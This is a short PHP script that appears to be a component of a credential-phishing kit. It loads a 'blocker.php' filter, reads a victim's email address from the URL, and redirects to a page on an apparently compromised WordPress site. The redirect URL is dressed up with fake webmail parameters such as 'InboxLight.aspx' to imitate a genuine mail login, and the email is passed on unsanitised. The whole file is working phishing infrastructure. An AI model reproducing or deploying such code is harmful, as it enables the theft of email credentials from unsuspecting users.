<?php
include('blocker.php');
session_start();
$email = $_GET['email'];
header("Location: http://iamameeta.com/wp-includes/IXR/Admin/?rand=13InboxLightaspxn.1774256418&fid.4.1252899642&fid=1&fav.1&rand.13InboxLight.aspxn.1774256418&fid.1252899642&fid.1&fav.1&email=$email&.rand=13InboxLight.aspx?n=1774256418&fid=4#n=1252899642&fid=1&fav=1");
?>